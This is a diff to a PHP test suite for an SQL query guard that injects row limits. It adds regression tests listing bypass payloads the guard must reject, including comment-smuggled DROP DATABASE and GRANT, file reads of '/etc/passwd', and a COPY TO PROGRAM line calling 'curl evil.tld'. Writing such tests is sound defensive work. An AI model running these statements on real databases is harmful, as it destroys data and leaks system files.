@@ -13,7 +13,7 @@ test('select without limit gets the default limit injected', function () {
     $result = inspect('SELECT * FROM users');
 
     expect($result->passes())->toBeTrue()
-        ->and($result->statements[0]->preparedSql)->toBe('SELECT * FROM users LIMIT 1000')
+        ->and($result->statements[0]->preparedSql)->toBe("SELECT * FROM users\nLIMIT 1000")
         ->and($result->statements[0]->limitInjected)->toBeTrue()
         ->and($result->type())->toBe(StatementType::Read);
 });
@@ -48,13 +48,13 @@ test('limit-offset form clamps the count only', function () {
 test('subquery limits are ignored when guarding the outer query', function () {
     $result = inspect('SELECT * FROM (SELECT id FROM t LIMIT 5) q');
 
-    expect($result->statements[0]->preparedSql)->toBe('SELECT * FROM (SELECT id FROM t LIMIT 5) q LIMIT 1000');
+    expect($result->statements[0]->preparedSql)->toBe("SELECT * FROM (SELECT id FROM t LIMIT 5) q\nLIMIT 1000");
 });
 
 test('limit is injected before a locking clause', function () {
     $result = inspect('SELECT * FROM jobs FOR UPDATE');
 
-    expect($result->statements[0]->preparedSql)->toBe('SELECT * FROM jobs LIMIT 1000 FOR UPDATE');
+    expect($result->statements[0]->preparedSql)->toBe("SELECT * FROM jobs\nLIMIT 1000\nFOR UPDATE");
 });
 
 test('limit all is clamped to the hard cap', function () {
@@ -190,3 +190,66 @@ test('trailing semicolon does not create a phantom statement', function () {
     expect($result->statements)->toHaveCount(1)
         ->and($result->passes())->toBeTrue();
 });
+
+// --- Regression: guard bypasses found in the 2026-09-07 security scan ---
+
+test('forbidden statements cannot be smuggled past the guard with comments', function (string $sql) {
+    expect(inspect($sql)->passes())->toBeFalse();
+})->with([
+    'leading block comment' => '/* hi */ DROP DATABASE prod',
+    'inline comment between keywords' => 'DROP/**/DATABASE prod',
+    'leading line comment' => "-- x\nGRANT ALL ON *.* TO 'x'@'%'",
+    'inline comment in SET GLOBAL' => 'SET/**/GLOBAL max_connections = 1',
+]);
+
+test('file-IO statements are always rejected', function (string $sql) {
+    expect(inspect($sql)->passes())->toBeFalse();
+})->with([
+    'SELECT INTO OUTFILE' => "SELECT * FROM users INTO OUTFILE '/tmp/x'",
+    'SELECT INTO DUMPFILE' => "SELECT * FROM users INTO DUMPFILE '/tmp/x'",
+    'LOAD DATA INFILE' => "LOAD DATA INFILE '/etc/passwd' INTO TABLE t",
+    'COPY TO program' => "COPY t TO PROGRAM 'curl evil.tld'",
+    'LOAD_FILE call' => "SELECT LOAD_FILE('/etc/passwd')",
+]);
+
+test('a data-modifying CTE is classified as a write, not a read', function () {
+    $result = inspect('WITH x AS (INSERT INTO t VALUES (1) RETURNING id) SELECT * FROM x');
+
+    expect($result->type())->toBe(StatementType::Write);
+});
+
+test('a trailing line comment cannot swallow the injected limit', function (string $sql) {
+    $prepared = inspect($sql)->statements[0]->preparedSql;
+
+    // The injected LIMIT must sit on its own line, outside the comment.
+    expect($prepared)->toContain("\nLIMIT 1000")
+        ->and($prepared)->toEndWith('LIMIT 1000');
+})->with([
+    'dash comment' => 'SELECT * FROM users --',
+    'hash comment' => 'SELECT * FROM users #',
+]);
+
+test('an arithmetic or otherwise unparseable LIMIT is rejected, not left unclamped', function () {
+    $result = inspect('SELECT * FROM users LIMIT 100*100000');
+
+    expect($result->passes())->toBeFalse();
+});
+
+test('FETCH FIRST n ROWS ONLY above the hard cap is clamped', function () {
+    $result = inspect('SELECT * FROM users ORDER BY id FETCH FIRST 9999999 ROWS ONLY');
+
+    expect($result->passes())->toBeTrue()
+        ->and($result->statements[0]->preparedSql)->toContain('FETCH FIRST 10000 ROWS ONLY')
+        ->and($result->statements[0]->limitClamped)->toBeTrue();
+});
+
+test('DROP TABLE and TRUNCATE pass as approval-gated writes flagged as DDL', function (string $sql) {
+    $result = inspect($sql);
+
+    expect($result->passes())->toBeTrue()
+        ->and($result->type())->toBe(StatementType::Write)
+        ->and($result->hasDdl())->toBeTrue();
+})->with([
+    'DROP TABLE old_logs',
+    'TRUNCATE TABLE sessions',
+]);
